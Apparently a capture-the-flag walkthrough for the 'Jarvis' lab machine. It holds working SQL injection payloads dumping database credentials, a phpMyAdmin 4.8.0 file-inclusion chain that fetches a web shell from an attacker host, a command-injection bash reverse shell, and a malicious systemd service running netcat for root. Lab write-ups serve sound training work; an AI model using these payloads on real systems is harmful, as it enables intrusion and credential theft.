################################
Jarvis
phpMyAdmin 4.8.0
SQL Injection - SQL MAP or BurpSuite
phpmyadmin SQL payload + Session Token = Remote Shell
https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/
Escape from restrcited Env: www-data
Python script bug exploit
systemctl SUID for Priv ESC
################################


1-Enumeration:
    nmap -T5 -sV -sC -Pn 10.10.10.143 -oN enum/scan1.logs -vv
    PORT      STATE    SERVICE     REASON      VERSION
    22/tcp    open     ssh         syn-ack     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
    | ssh-hostkey: 
    80/tcp    open     http        syn-ack     Apache httpd 2.4.25 ((Debian))
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: Stark Hotel
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-server-header: Apache/2.4.25 (Debian)
    548/tcp   filtered afp         no-response
    1051/tcp  filtered optima-vnet no-response
    2144/tcp  filtered lv-ffx      no-response
    3827/tcp  filtered netmpi      no-response
    33354/tcp filtered unknown     no-response
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    PORT 80:
        Apache 2.4.25
        Open Graph

        nikto -h:
            http://10.10.10.143/phpmyadmin/
                phpMyAdmin - ChangeLog   4.8.0 (2018-04-07)
            /phpmyadmin/ChangeLog
                - issue        [security] Possible to bypass $cfg['Servers'][$i]['AllowNoPassword'], see PMASA-2017-08
            /phpmyadmin/README

        <?php system($_GET["cmd"]) ?> in the URL

        We try:
            http://10.10.10.143/phpmyadmin/setup/



        SQL Injection:
            room.php can be vulnerable to sql injection:

            As we go-ahead we will use sqlmap to scan this url “http://10.10.10.143/room.php?cod=1” and analyse if this vulnerable to sql injection.
            We will intercept the request with burp and copy the request in sql.txt file.

                sqlmap -r sql.txt — dbs — batch
                sqlmap -r sql.txt -D hotel — dump-all — batch

            We found "user.csv" in mysql database file where we can see user and password of phpmyadmin

            We have access to admin page


        Burp Suite Manual Way to extract data from MSQL:
            room.php?cod=9999+union+select+"1","2",(select+group_concat(host,"%3a",user,":",passwd,"\r\n")+from+mysql.user),"4","5","6","7"
            OR
            room.php?cod=9999+union+select+"1","2",(LOAD_FILE("/etc/passwd")),"4","5","6","7"

        
        phpMyAdmin Exploit:
            http://10.10.10.143/phpmyadmin/server_sql.php
                in SQL tab of the main page:
                    select '<?php exec("wget -O /var/www/html/shell.php http://10.10.16.28:80/phpShell.php"); exit; ?>'    

            We copy the session cookie:
                idn8lt3i7fkfe2d8rf29ja548edq5uub

                and we add to the URL:
                    http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_idn8lt3i7fkfe2d8rf29ja548edq5uub

            Then to execute the payload we got to:
                10.10.10.143/shell.php

            Get a better shell via TTY:
                python3 -c 'import pty;pty.spawn("/bin/bash");'

            We have a shell


2-Exploit:
    to add linpeas.sh we will go to te same filepath as our payload:
        cd /var/www/html/
        www-data@jarvis:/var/www/html$  wget http://10.10.16.28:80/linpeas.sh

    Their is some Kernel exploit possibilities
        Linux version 4.9.0

    But we see with "sudo -l":
        User www-data may run the following commands on jarvis:
        (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py

    We will use it to escalate our privileges:
        sudo -u#1000 /var/www/Admin-Utilities/simpler.py

    We will create a reverse shell into simpler.py to EXPLOIT A BUG:
        vi /tmp/shell4.sh
        bash -i >& /dev/tcp/10.10.16.28/9001 0>&1


    python simpler.py:
        sudo -u#1000 /var/www/Admin-Utilities/simpler.py -p
        $(bash /tmp/shell4.sh)
        python3 -c 'import pty;pty.spawn("/bin/bash");'



    Priv Esc:
    Now we are the user named 'papper'
        
        

        We found:
            systemctl
            First we start another listener Port 4343 

            Now, we create the new service using the commands below with embedding a reverse shell netcat command:

                echo "[Service]
                >[Unit]
                >Description=root
                >
                >[Service]
                >Type=Simple
                >user=root
                ExecStart=/bin/sh -c 'nc -e /bin/bash 10.10.16.28 4343'>
                >[Install]
                >WantedBy=multi-user.target" > priv.service

            Fianlly we enable the service:

                pepper@jarvis:~$ /bin/systemctl enable --now /home/pepper/priv.service
                /bin/systemctl enable --now /home/pepper/priv.service
                Created symlink /etc/systemd/system/multi-user.target.wants/priv.service -> /home/pepper/priv.service.
                Created symlink /etc/systemd/system/priv.service -> /home/pepper/priv.service.
                pepper@jarvis:~$ /bin/systemctl start /home/pepper/priv.service
                /bin/systemctl start /home/pepper/priv.service
                
        We Have a ROOT SHELL

                        
